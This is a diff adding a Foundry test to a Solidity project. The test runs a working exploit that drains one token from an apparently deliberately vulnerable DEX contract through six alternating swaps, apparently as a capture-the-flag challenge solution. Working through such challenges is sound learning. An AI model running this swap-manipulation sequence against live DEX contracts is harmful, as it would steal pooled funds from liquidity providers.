@@ -29,6 +29,40 @@ contract DexTest is Test {
         vm.label(attacker, "Attacker");
     }
 
+    function testExploit() public {
+    vm.startPrank(attacker);
+    
+    // Approve DEX to spend tokens
+    swappabletokenA.approve(address(dex), type(uint256).max);
+    swappabletokenB.approve(address(dex), type(uint256).max);
+
+    // Initial balances
+    console.log("Initial DEX Token A balance:", swappabletokenA.balanceOf(address(dex)));
+    console.log("Initial DEX Token B balance:", swappabletokenB.balanceOf(address(dex)));
+    console.log("Initial Attacker Token A balance:", swappabletokenA.balanceOf(attacker));
+    console.log("Initial Attacker Token B balance:", swappabletokenB.balanceOf(attacker));
+
+    // Perform swaps to drain Token A
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 10);
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 20);
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 24);
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 30);
+    dex.swap(address(swappabletokenA), address(swappabletokenB), 41);
+    dex.swap(address(swappabletokenB), address(swappabletokenA), 45);
+
+    // Final balances
+    console.log("Final DEX Token A balance:", swappabletokenA.balanceOf(address(dex)));
+    console.log("Final DEX Token B balance:", swappabletokenB.balanceOf(address(dex)));
+    console.log("Final Attacker Token A balance:", swappabletokenA.balanceOf(attacker));
+    console.log("Final Attacker Token B balance:", swappabletokenB.balanceOf(attacker));
+
+    // Assert that Token A has been drained from DEX
+    assertEq(swappabletokenA.balanceOf(address(dex)), 0);
+    
+    vm.stopPrank();
+}
+
+
     
 
 }
